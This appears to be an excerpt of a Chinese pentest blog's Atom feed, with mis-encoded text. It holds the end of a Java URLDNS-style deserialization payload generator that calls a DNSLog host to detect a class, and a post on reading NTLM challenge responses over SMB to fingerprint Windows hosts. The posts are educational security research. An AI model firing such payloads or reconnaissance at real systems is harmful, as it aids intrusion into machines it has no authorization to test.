&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;net&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;URL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javassist&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javassist&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;CtClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Urldns&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt; hashMap &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token class-name&quot;&gt;URL&lt;/span&gt; url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;http://333.f9575af1.dns.1433.eu.org&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt; f &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.net.URL&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;hashCode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token comment&quot;&gt;//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);&lt;/span&gt;
          hashMap&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;org.apache.commons.beanutils.BeanComparator&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ObjectOutputStream&lt;/span&gt; oos &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;1.ser&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        oos&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;writeObject&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;hashMap&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;1.ser&quot;));&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//ois.readObject();&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; clazzName&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt; classPool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDefault&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;CtClass&lt;/span&gt; ctClass &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; classPool&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;clazzName&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ctClass&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        ctClass&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;defrost&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>NTLMç«¯å£ä¿¡æ¯æ¢æµ‹</title>
    <link href="https://jkme.github.io/2021/08/06/windows-ntlm-smb-scan.html"/>
    <id>https://jkme.github.io/2021/08/06/windows-ntlm-smb-scan.html</id>
    <published>2021-08-05T16:00:00.000Z</published>
    <updated>2022-01-21T03:21:08.062Z</updated>
    
    <content type="html"><![CDATA[<p>SMBï¼ˆServer Message Blockï¼‰åè®®ï¼Œå¯ç”¨äºåœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£ç­‰ï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é å®ƒå®ç°çš„ã€‚SMBä½¿ç”¨äº†NetBIOSçš„åº”ç”¨ç¨‹åºæ¥å£ ï¼ˆApplication Program Interfaceï¼Œç®€ç§°APIï¼‰ã€‚å¦å¤–ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼€æ”¾æ€§çš„åè®®ï¼Œå…è®¸äº†åè®®æ‰©å±•â€”â€”ä½¿å¾—å®ƒå˜å¾—æ›´å¤§è€Œä¸”å¤æ‚ï¼›å¤§çº¦æœ‰65ä¸ªæœ€ä¸Šå±‚çš„ä½œä¸šï¼Œè€Œæ¯ä¸ªä½œä¸šéƒ½è¶…è¿‡120ä¸ªå‡½æ•°ï¼Œç”šè‡³Windows NTä¹Ÿæ²¡æœ‰å…¨éƒ¨æ”¯æŒåˆ°ï¼Œæœ€è¿‘å¾®è½¯åˆæŠŠ SMB æ”¹åä¸º CIFSï¼ˆCommon Internet File Systemï¼‰ï¼Œå¹¶ä¸”åŠ å…¥äº†è®¸å¤šæ–°çš„ç‰¹è‰²ã€‚SMBåè®®ä¸€èˆ¬ç«¯å£ä½¿ç”¨ä¸º139ï¼Œ445ï¼ŒCIFSåè®®æœ‰ä¸‰ä¸ªç‰ˆæœ¬ï¼šSMBã€SMB2ã€SMB3ã€‚</p><h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>åœ¨type2è¿”å›Challengeçš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶è¿”å›äº†æ“ä½œç³»ç»Ÿç±»å‹ï¼Œä¸»æœºåï¼Œnetbiosåç­‰ç­‰ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬åœ¨èƒ½è·ŸæœåŠ¡å™¨è¿›è¡ŒNTLMäº¤æµä¸­ï¼Œç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªtype1çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›type2çš„å“åº”ï¼Œè¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å¾ˆå¤šä¿¡æ¯ã€‚SMBv1å’ŒSMBv2çš„æ•°æ®åŒ…ç»“æ„æ˜¯ä¸åŒçš„</p><h3 id="SMBv1"><a href="#SMBv1" class="headerlink" title="SMBv1"></a>SMBv1</h3><p>ä½¿ç”¨<a href="https://github.com/FeigongSec/NTLMINFO">éæ”»NTLMINFO</a>æ¢æµ‹SMBæ¥å£ï¼ŒæŠ“åŒ…é€šè¿‡wiresharkåˆ†æï¼ŒåŒ…å«æ“ä½œç³»ç»Ÿç±»å‹çš„æ•°æ®åŒ…ç”±SMB Headerå’ŒResponseç»„æˆï¼š<br><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png"><br>æˆ‘ä»¬çš„ç›®çš„æ˜¯è·å–smbæ•°æ®åŒ…çš„NTLMæ•°æ®ï¼Œç„¶åå¯¹NTLMæ•°æ®åŒ…è§£æï¼ŒNTLMæ•°æ®åŒ…ä¸Šä¸€å±‚æ˜¯GSS-APIï¼Œé¦–å…ˆæ‰¾åˆ°GSS-APIåœ¨æ•´ä¸ªæ•°æ®åŒ…çš„åç§»é‡ï¼ŒSMBçš„æ•°æ®åŒ…ç»“æ„é•¿åº¦å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">SMB Header:  32 byteWord Count:  1 byteAndXCommand: 1 byteReserved:    1 byteAndXOffset:  2 byteAction:    2 byteSecurity Blob Length: 2 byte (è¡¨ç¤ºSecurity Blobçš„é•¿åº¦ï¼Œè¿™é‡Œçš„hexæ˜¯ 0f 10ï¼Œå°ç«¯è½¬æ¢ä¸º010f,å†è½¬æ¢æˆ10è¿›åˆ¶å°±æ˜¯271ï¼Œå¯¹åº”Security Blobçš„é•¿åº¦)Byte Count: 2 byte (è¡¨ç¤ºSecurity BlobåŠ ä¸ŠNativeOSå’ŒNative Lançš„é•¿åº¦)Security Blob: å¯å˜é•¿åº¦ï¼Œå–å†³äºSecurity Blob Length<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šé¢çš„æ•°æ®åŒ…ç»“æ„çš„å…³é”®æ•°æ®æ˜¯<code>Security Blob Length</code>å’Œ<code>Byte Content</code>ï¼Œå‰è€…è¡¨ç¤ºGSS-APIçš„æ•´ä¸ªæ•°æ®åŒ…é•¿åº¦ï¼Œåè€…è¡¨ç¤ºGSS-APIå’ŒNative OSåŠ ä¸ŠNative LMçš„æ•°æ®é•¿åº¦ï¼š</p><h6 id="GSS-APIçš„é•¿åº¦æ˜¯271-Byte"><a href="#GSS-APIçš„é•¿åº¦æ˜¯271-Byte" class="headerlink" title="GSS-APIçš„é•¿åº¦æ˜¯271 Byte"></a>GSS-APIçš„é•¿åº¦æ˜¯271 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png"></p><h6 id="Native-OSçš„é•¿åº¦æ˜¯42-Byte"><a href="#Native-OSçš„é•¿åº¦æ˜¯42-Byte" class="headerlink" title="Native OSçš„é•¿åº¦æ˜¯42 Byte"></a>Native OSçš„é•¿åº¦æ˜¯42 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.1.png"></p><h6 id="Native-LMçš„é•¿åº¦æ˜¯38-Byte"><a href="#Native-LMçš„é•¿åº¦æ˜¯38-Byte" class="headerlink" title="Native LMçš„é•¿åº¦æ˜¯38 Byte"></a>Native LMçš„é•¿åº¦æ˜¯38 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.2.png"></p><p>æ‰€ä»¥æ•°å­¦é¢˜æ¥äº†ï¼š<br>Security Blob Lengthè½¬æ¢æˆ10è¿›åˆ¶æ˜¯271 Byte</p><p>Byte Count: 271 + 42 + 38 = 351 Byte<br>æˆ‘ä»¬çš„ç›®çš„æ˜¯è·å–NTLMçš„æ•°æ®å’ŒNativeOSå’ŒNative LMï¼Œå›åˆ°ä»£ç é‡Œé¢å»çœ‹çœ‹ï¼Œå½“æˆ‘ä»¬è·å–åˆ°type2çš„æ•°æ®ï¼Œè·å–åˆ°çš„æ•°æ®æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-4.png"></p><p>NetBIOS Session Serviceè¿™ä¸€å±‚çš„é•¿åº¦æ˜¯4 Byteï¼Œ<code>Security Blob Length</code>çš„åç§»é‡å°±å‡ºæ¥äº†: </p><pre class="line-numbers language-none"><code class="language-none">4 + 32 + 1 + 1 + 1 + 2 + 2 &#x3D; 43<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥<code>Security Blob Length</code>åç§»ä»43å¼€å§‹ï¼Œé•¿åº¦æ˜¯2 Byteï¼Œ <code>Security Blob</code>è·Ÿåœ¨åé¢ï¼Œåç§»ä»45å¼€å§‹ï¼Œ47ç»“æŸï¼Œgoè¯­è¨€ä¼ªä»£ç ï¼š</p><pre class="line-numbers language-none"><code class="language-none">blob_length :&#x3D; uint16(bytes2Uint(ret[43:45], &#39;&lt;&#39;))blob_count :&#x3D; uint16(bytes2Uint(ret[45:47], &#39;&lt;&#39;))&#x2F;&#x2F;gsså˜é‡è¡¨ç¤ºä»Security Blobèµ·å§‹ä½ç½®åˆ°æ•°æ®åŒ…ç»“æŸï¼ŒåŒ…æ‹¬äº†Native OSå’ŒNative LMgss :&#x3D; ret[47:]&#x2F;&#x2F;æ‰¾åˆ°NTLMSSPåœ¨gssçš„åç§»èµ·å§‹ä½ç½®off_ntlm :&#x3D; bytes.Index(gss, []byte(&quot;NTLMSSP&quot;))&#x2F;&#x2F;Native OSå’ŒNative LMæ•°æ®ï¼Œå¯¹åº”ä¸Šé¢çš„å›¾native :&#x3D; gss[int(blob_length):blob_count]&#x2F;&#x2F;bsè¡¨ç¤ºntlmçš„æ•°æ®ï¼Œä»¥NTLMSSPå¼€å¤´bs :&#x3D; gss[off_ntlm:blob_length]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥ä¸»è¦å·¥ä½œå°±æ˜¯è§£æNTLMçš„æ•°æ®ï¼Œæ„Ÿè°¢iv4nå¸ˆå‚…çš„<a href="http://iv4n.cc/ntlmssp/">Windows NTLMåè®®ç»†èŠ‚</a>ï¼Œæˆ‘forkäº†ä¸€ä»½<a href="https://github.com/JKme/go-ntlmssp">go-ntlmssp</a>ï¼Œå¢åŠ äº†è§£æNTLMè¾“å‡ºå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥è·å–NTLMSSPæ•°æ®çš„è§£æç»“æœï¼š</p><pre class="line-numbers language-none"><code class="language-none">func TestChallengeMsg_String(t *testing.T) &#123;bs, _ :&#x3D; hex.DecodeString(&quot;4e544c4d535350xxxxx&quot;)type2 :&#x3D; ChallengeMsg&#123;&#125;info :&#x3D; type2.String(bs)fmt.Println(info)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-5.png"></p><p>Windows10é»˜è®¤ä½¿ç”¨SMBv2åè®®ï¼Œæ²¡æœ‰æ‰“å¼€SMBv1å¼€å…³ï¼Œ<a href="https://github.com/RowTeam/SharpDetectionNTLMSSP">Rcollå¸ˆå‚…çš„SharpDetectionNTLMSSP</a>åªå‘é€äº†SMBv1çš„æ¢æµ‹ï¼Œæ²¡æœ‰æ¢æµ‹SMBv2ã€‚<a href="https://github.com/FeigongSec/NTLMINFO">éæ”»NTLMINFO</a>å¸ˆå‚…å°±æ¯”è¾ƒå®Œæ•´ï¼Œå…ˆæ¢æµ‹SMBv1ï¼Œå¤±è´¥ä¹‹åå°è¯•SMBv2ã€‚</p><h3 id="SMBv2"><a href="#SMBv2" class="headerlink" title="SMBv2"></a>SMBv2</h3><p>å‚è€ƒ<a href="https://github.com/FeigongSec/NTLMINFO/blob/016e1859b7c0f4cc55c923027bc24174b0586bc7/SmbInfo/SmbInfo/Program.cs#L83">éæ”»å¸ˆå‚…çš„ä»£ç </a>ï¼Œå…ˆå‘é€ç¬¬ä¸€æ¬¡çš„æ¢æµ‹è¯·æ±‚ï¼Œæ‰¾åˆ°åç§»é‡70çš„åœ°æ–¹ï¼Œåšä¸€æ¬¡åˆ¤æ–­æ˜¯å¦å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…ã€‚æ¢æˆGOä»£ç å°±æ¯”è¾ƒç®€å•äº†ï¼Œè¿™é‡Œçš„åç§»70ä¿å­˜çš„æ˜¯æ˜¯SMBv2çš„<code>Security mode</code>:</p><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-6.png"></p><p>Goè¯­è¨€å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">var NTLMSSPNegotiatev2Data []byteif hex.EncodeToString(r2[70:71]) &#x3D;&#x3D; &quot;03&quot; &#123;flags :&#x3D; []byte&#123;0x15, 0x82, 0x08, 0xa0&#125;NTLMSSPNegotiatev2Data &#x3D; getNTLMSSPNegotiateData(flags)&#125; else &#123;flags :&#x3D; []byte&#123;0x05, 0x80, 0x08, 0xa0&#125;NTLMSSPNegotiatev2Data &#x3D; getNTLMSSPNegotiateData(flags)&#125;_, err &#x3D; conn2.Write(NegotiateSMBv2Data2)if err !&#x3D; nil &#123;return&#125;readBytes(conn2)_, err &#x3D; conn2.Write(NTLMSSPNegotiatev2Data)ret, _ :&#x3D; readBytes(conn2)ntlmOff :&#x3D; bytes.Index(ret, []byte(&quot;NTLMSSP&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆå“ä¸»è¦å‚è€ƒéæ”»å¸ˆå‚…çš„ä»£ç ï¼Œé›†æˆåˆ°<a href="https://github.com/JKme/cube">Cube</a>ï¼Œå®Œæˆäº†winrmã€wmiã€smbã€mssqlç«¯å£çš„NTLMä¿¡æ¯æ¢æµ‹ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://github.com/FeigongSec/NTLMINFO">éæ”»NTLMINFO</a></li><li><a href="https://github.com/RowTeam/SharpDetectionNTLMSSP">Rcollå¸ˆå‚…çš„SharpDetectionNTLMSSP</a></li><li><a href="https://github.com/zmap/zgrab2/tree/master/lib/smb/smb">An SMB library in Go</a></li><li><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4">NTLMåŸºç¡€ä»‹ç»</a></li><li><a href="http://iv4n.cc/ntlmssp/">Windows NTLMåè®®ç»†èŠ‚</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688">Server Message Block (SMB) Protocol</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5606ad47-5ee0-437a-817e-70c366052962">Server Message Block (SMB) Protocol Versions 2 and 3</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;SMBï¼ˆServer Message Blockï¼‰åè®®ï¼Œå¯ç”¨äºåœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£ç­‰ï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é å®ƒå®ç°çš„ã€‚SMBä½¿ç”¨äº†NetBIOSçš„åº”ç”¨ç¨‹åºæ¥å£ ï¼ˆApplication Program Interfaceï¼Œç®€ç§°APIï¼‰ã€‚å¦å¤–ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼€æ”¾æ€§çš„åè®®ï¼Œå…è®¸äº†åè®®æ‰©å±•â€”â€”ä½¿å¾—å®ƒå˜å¾—æ›´å¤§è€Œä¸”å¤æ‚ï¼›å¤§çº¦æœ‰65ä¸ªæœ€ä¸Šå±‚çš„ä½œä¸šï¼Œè€Œæ¯ä¸ªä½œä¸šéƒ½è¶…è¿‡120ä¸ªå‡½æ•°ï¼Œç”šè‡³Windows NTä¹Ÿæ²¡æœ‰å…¨éƒ¨æ”¯æŒåˆ°ï¼Œæœ€è¿‘å¾®è½¯åˆæŠŠ SMB æ”¹åä¸º CIFSï¼ˆCommon Internet File Systemï¼‰ï¼Œå¹¶ä¸”åŠ å…¥äº†è®¸å¤šæ–°çš„ç‰¹è‰²ã€‚SMBåè®®ä¸€èˆ¬ç«¯å£ä½¿ç”¨ä¸º139ï¼Œ445ï¼ŒCIFSåè®®æœ‰ä¸‰ä¸ªç‰ˆæœ¬ï¼šSMBã€SMB2ã€SMB3ã€‚&lt;/p&gt;
